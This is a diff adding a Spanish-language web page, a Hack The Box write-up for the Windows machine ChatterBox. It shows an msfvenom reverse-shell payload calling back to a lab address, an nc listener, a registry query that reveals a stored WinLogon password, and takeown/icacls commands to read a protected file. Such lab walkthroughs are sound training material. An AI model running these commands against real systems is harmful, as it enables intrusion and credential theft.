@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | ChatterBox HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/chatterbox/pasted-20260310120555.png" alt="ChatterBox HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>ChatterBox</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>buffer_overflow</span>
+            <span>p9255</span>
+            <span>p9256</span>
+            <span>Achat</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Servicio Achat expuesto en los puertos 9255/9256</li>
+            <li><code>Explotación</code>: Buffer overflow en Achat para obtener shell</li>
+            <li><code>Escalada de Privilegios</code>: Credenciales almacenadas en WinLogon reutilizables para elevar privilegios</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/chatterbox/pasted-20260310125947.png" alt="ChatterBox HTB" />
+          <img class="writeup-image" src="/writeups/assets/chatterbox/pasted-20260310130002.png" alt="ChatterBox HTB" />
+          <div class="code-card">
+            <h3>Buscar vulnerabilidades Achat</h3>
+            <pre><code>searchsploit achat
+searchsploit -m 36025</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/chatterbox/pasted-20260310130112.png" alt="ChatterBox HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Buffer Overflow</h2>
+          <img class="writeup-image" src="/writeups/assets/chatterbox/pasted-20260310130415.png" alt="ChatterBox HTB" />
+          <div class="code-card">
+            <h3>Copiar payload para sustituirlo en el exploit</h3>
+            <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.69 LPORT=4443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/chatterbox/pasted-20260310130446.png" alt="ChatterBox HTB" />
+          <div class="code-card">
+            <h3>Ejecutar buff.py</h3>
+            <pre><code>python2.7 buff.py
+# Listener
+rlwrap nc -nlvp 4443</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/chatterbox/pasted-20260310125912.png" alt="ChatterBox HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios:</h2>
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversión\Winlogon"
+# Contraseña: Welcome1!</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/chatterbox/pasted-20260310132713.png" alt="ChatterBox HTB" />
+          <img class="writeup-image" src="/writeups/assets/chatterbox/pasted-20260310132830.png" alt="ChatterBox HTB" />
+          <div class="code-card">
+            <h3>Leer fichero como administrator cuando recibimos el &#x27;error access denied&#x27;</h3>
+            <pre><code>takeown /f root.txt
+icacls root.txt /grant administrators:F
+type root.txt</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>buffer_overflow</span>
+            <span>p9255</span>
+            <span>p9256</span>
+            <span>Achat</span>
+            <span>winlogon</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
